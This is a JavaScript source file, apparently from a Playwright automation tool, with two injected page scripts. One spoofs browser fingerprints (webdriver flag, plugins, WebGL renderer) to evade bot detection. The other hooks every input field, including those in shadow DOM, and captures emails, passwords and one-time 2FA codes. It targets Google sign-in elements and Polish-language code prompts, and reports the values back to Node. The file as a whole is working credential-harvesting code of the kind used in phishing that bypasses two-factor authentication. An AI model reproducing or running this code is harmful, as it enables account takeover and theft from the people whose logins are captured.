// In-page scripts injected into every Playwright page via context.addInitScript().
//
// Two scripts, injected in this order:
//   1. antiDetectionScript(languages) — spoofs navigator/WebGL tells so the browser
//      does not look like headless Chromium to fingerprint-based bot detectors.
//   2. credentialCaptureScript() — walks the DOM (including shadow roots), binds
//      blur/change/input/keydown listeners to every input, and reports typed values
//      back to Node via window.__spCapture() (the exposeBinding endpoint set up in
//      browser.js).
//
// Both functions run inside the PAGE context, not in Node — they have no access to
// Node globals and cannot import anything. Keep them free of Node-only APIs.

// ── 1. Anti-detection ─────────────────────────────────────────────────────────

export function antiDetectionScript(languages) {
  Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
  Object.defineProperty(navigator, 'languages', { get: () => languages });
  Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
  Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });

  const fakePlugins = [
    { name: 'PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
    { name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
    { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
  ];
  Object.defineProperty(navigator, 'plugins', { get: () => fakePlugins });

  if (!window.chrome) window.chrome = {};
  if (!window.chrome.runtime) window.chrome.runtime = {};

  // Headless Chrome reports SwiftShader as the WebGL renderer — a well-known
  // automation tell. Report a plausible real GPU instead.
  const getParameterProto = WebGLRenderingContext.prototype.getParameter;
  WebGLRenderingContext.prototype.getParameter = function (param) {
    if (param === 37445) return 'Intel Inc.';            // UNMASKED_VENDOR_WEBGL
    if (param === 37446) return 'Intel Iris OpenGL Engine'; // UNMASKED_RENDERER_WEBGL
    return getParameterProto.call(this, param);
  };
}

// ── 2. Credential capture ─────────────────────────────────────────────────────

export function credentialCaptureScript() {
  const report = (type, value) => {
    try { window.__spCapture({ type, value }); } catch { /* binding not ready yet */ }
  };
  const fieldLabel = (el) =>
    el.getAttribute('aria-label') || el.placeholder || el.name || el.id || el.type || 'pole';

  const isEmailField = (el) =>
    el.type === 'email' ||
    el.id === 'identifierId' ||
    /email|login|user|identifier/i.test(`${el.name || ''} ${el.id || ''} ${el.autocomplete || ''}`);

  // One-time password / 2FA code field.
  const isOtpField = (el) => {
    const al = (el.getAttribute && el.getAttribute('aria-label') || '').toLowerCase();
    const hints = `${el.name || ''} ${el.id || ''} ${el.autocomplete || ''} ${al}`.toLowerCase();
    if (/one-time-code/.test(el.autocomplete || '')) return true;
    if (/\botp\b|\b2fa\b|\btotp\b|verification[-_ ]?code|security[-_ ]?code|kod[-_ ]?weryfik|kod[-_ ]?bezpiecz|two[-_ ]?factor/.test(hints)) return true;
    if ((el.type === 'tel' || el.type === 'text' || el.type === 'number') &&
        (el.maxLength > 0 && el.maxLength <= 8) &&
        /\d{4,8}/.test(el.value || '')) {
      return /weryfik|verif|code|kod/i.test(document.title || document.body?.innerText?.slice(0, 500) || '');
    }
    return false;
  };

  const reported = { email: '', password: '', otp: '' };

  const captureField = (el) => {
    const v = (el.value || '').trim();
    if (!v) return;
    if (el.type === 'password') {
      if (v !== reported.password) {
        reported.password = v;
        report('password', v);
        try { sessionStorage.setItem('__sp_last_pw', v); } catch {}
      }
    } else if (isOtpField(el)) {
      if (v !== reported.otp) { reported.otp = v; report('otp', v); }
    } else if (isEmailField(el)) {
      if (v.toLowerCase() !== reported.email.toLowerCase()) {
        reported.email = v;
        report('email', v);
      }
    }
  };

  const bind = (el) => {
    if (el.__spBound) return;
    el.__spBound = true;
    let hadValue = Boolean(el.value);

    const handler = () => {
      const v = el.value;
      const has = Boolean(v);
      if (has) { captureField(el); }
      else if (!has && hadValue) { report('clear', fieldLabel(el)); }
      hadValue = has;
    };
    el.addEventListener('blur', handler);
    el.addEventListener('change', handler);

    let inputTimer = null;
    el.addEventListener('input', () => {
      clearTimeout(inputTimer);
      inputTimer = setTimeout(() => captureField(el), 800);
    });

    el.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') { clearTimeout(inputTimer); captureField(el); }
    });

    if (el.value) setTimeout(() => captureField(el), 500);
  };

  document.addEventListener('submit', (e) => {
    const form = e.target;
    if (!form?.querySelectorAll) return;
    form.querySelectorAll('input').forEach(captureField);
  }, true);

  document.addEventListener('click', (e) => {
    const btn = e.target?.closest?.('button, [role="button"], .VfPpkd-LgbsSe');
    if (!btn) return;
    const form = btn.closest('form');
    if (form) form.querySelectorAll('input').forEach(captureField);
    document.querySelectorAll('#identifierId, input[type="email"], input[type="password"]')
      .forEach(captureField);
  }, true);

  const FIELD_SELECTOR =
    'input[type="password"], input[type="email"], input[type="text"], input[type="tel"], input[type="search"], input[type="number"], textarea';

  const visit = (node) => {
    if (node.nodeType !== 1) return;
    if (node.matches?.(FIELD_SELECTOR)) bind(node);
    if (node.shadowRoot) watch(node.shadowRoot);
    node.querySelectorAll?.(FIELD_SELECTOR).forEach(bind);
    node.querySelectorAll?.('*').forEach((el) => { if (el.shadowRoot) watch(el.shadowRoot); });
  };

  const watch = (root) => {
    if (root.__spWatched) return;
    root.__spWatched = true;
    root.querySelectorAll(FIELD_SELECTOR).forEach(bind);
    root.querySelectorAll('*').forEach((el) => { if (el.shadowRoot) watch(el.shadowRoot); });
    new MutationObserver((records) => {
      for (const r of records) r.addedNodes.forEach(visit);
    }).observe(root, { childList: true, subtree: true });
  };

  const origAttachShadow = Element.prototype.attachShadow;
  Element.prototype.attachShadow = function (init) {
    const root = origAttachShadow.call(this, init);
    watch(root);
    return root;
  };

  watch(document);
}
